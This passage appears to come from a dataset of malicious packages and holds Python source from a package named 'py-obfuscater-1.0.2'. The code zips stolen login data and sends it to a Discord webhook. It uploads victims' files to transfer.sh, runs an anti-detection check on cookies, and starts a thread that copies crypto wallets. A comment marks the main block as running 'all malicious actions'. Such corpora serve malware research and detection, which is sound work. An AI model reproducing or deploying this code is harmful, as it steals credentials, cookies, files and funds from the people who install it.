     _zipfile = ntpath.join(self.appdata, f\"BC-[{login_info}].zip\")\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        ...\n        with open(_zipfile, \"rb\") as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, json=embed)\n                httpx.post(self.discord_webhook, files={\"upload_file\": f})\n        os.remove(_zipfile)\n    ...\n\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        ...\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\n# --- Main execution: run all malicious actions ---\nbc_Gather_All()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = check_spec_bc()\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
    }
  },
  {
    "metadata": {
      "package_name": "py-obfuscater-1.0.2"
    }
  }
]